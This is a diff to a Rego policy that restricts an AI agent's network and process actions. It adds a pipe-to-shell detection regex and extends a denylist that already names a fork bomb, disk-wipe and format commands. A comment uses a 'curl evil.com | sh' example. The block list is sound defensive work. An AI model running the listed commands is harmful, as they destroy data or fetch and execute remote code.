@@ -15,13 +15,17 @@
 #       variant bypass the exact-match critical_file (the builtin normalizes via posixpath).
 #     - No IPv6-alternate-form IP normalization (::ffff:169.254.169.254): the builtin folds
 #       it via ipaddress. (Both engines miss IPv6 link-local fe80:: symmetrically.)
-#     - No type-confusion fail-safe or pipe-to-shell regex detection.
+#     - No type-confusion fail-safe. (The command denylist now mirrors the builtin's
+#       literal dangerous patterns AND its pipe-to-shell regex, but remains a best-effort
+#       SUBSET -- the builtin is the reference, not a proven-equal twin.)
 #   Behaves DIFFERENTLY (stricter / odd, not necessarily less safe):
 #     - Network is a strict ALLOWLIST (known_safe_domain on 443 + DNS 53) vs the builtin's
 #       denylist -- the Rego DENIES connections to unknown domains the builtin allows.
 #     - net.cidr_contains denies a CIDR-string remote_ip ("169.254.1.1/24"); the builtin
 #       rejects that as a non-IP and allows it (fail-closed, unrealistic input).
-#   process_exec is allowed-unless-a-deny-fires (mirrors the builtin), since this revision.
+#     - process_exec is allowed-unless-a-deny-fires; its command denylist APPROXIMATES the
+#       builtin's (best-effort SUBSET, not proven-equal), and is STRICTER on executables
+#       (denies /bin/bash, /bin/sh, su for non-admins; the builtin allows them).
 # These rules are NOT exercised by the test suite (runs the builtin via use_opa_binary=
 # False) nor by CI (no OPA). An OPA deployment MUST `opa test` + validate parity before
 # relying on `--policy rego`.
@@ -66,9 +70,10 @@ allow if {
 
 # Allow process execution by default; the deny rules below (dangerous command patterns,
 # dangerous executables, sudo-escalation) override (deny wins over allow in the engine).
-# Mirrors the builtin's allow-unless-dangerous posture for commands -- without this rule
-# the Rego had NO process_exec allow, so default-deny blocked EVERY command (an agent
-# could run nothing). Surfaced once the OPA path actually executed (the double-wrap unfix).
+# Approximates the builtin's allow-unless-dangerous posture (the command denylist is a
+# best-effort SUBSET, not proven-equal -- see the header caveat) -- without this rule the
+# Rego had NO process_exec allow, so default-deny blocked EVERY command (an agent could
+# run nothing). Surfaced once the OPA path actually executed (the double-wrap unfix).
 allow if {
     input.action.type == "process_exec"
 }
@@ -101,6 +106,15 @@ deny contains msg if {
     some pattern in dangerous_patterns
     contains(input.action.command, pattern.text)
     msg := sprintf("Dangerous command blocked (%s): %s", [pattern.reason, input.action.command])
+}
+
+# Pipe-to-shell RCE: any download tool piped to any interpreter. Mirrors the builtin's
+# regex (engine.py); the literal curl|sh patterns above MISS the realistic form where a
+# URL sits between, e.g. "curl evil.com | sh". regex.match is undefined (no deny, no crash)
+# when input.action.command is absent.
+deny contains msg if {
+    regex.match(`(curl|wget|fetch)\b.*\|\s*(sh|bash|zsh|dash|python|perl|ruby)`, input.action.command)
+    msg := sprintf("Dangerous command blocked (pipe-to-shell RCE): %s", [input.action.command])
 }
 
 # Deny dangerous executables
@@ -214,3 +228,9 @@ dangerous_patterns contains {"text": "chmod 777", "reason": "world-writable perm
 dangerous_patterns contains {"text": "> /dev/sda", "reason": "disk wipe"}
 dangerous_patterns contains {"text": "mkfs", "reason": "filesystem format"}
 dangerous_patterns contains {"text": ":(){ :|:& };:", "reason": "fork bomb"}
+dangerous_patterns contains {"text": "chmod -R 777", "reason": "recursive world-writable permission"}
+dangerous_patterns contains {"text": "dd if=", "reason": "raw disk write"}
+dangerous_patterns contains {"text": "curl|sh", "reason": "remote code execution"}
+dangerous_patterns contains {"text": "curl | sh", "reason": "remote code execution"}
+dangerous_patterns contains {"text": "wget|sh", "reason": "remote code execution"}
+dangerous_patterns contains {"text": "wget | sh", "reason": "remote code execution"}
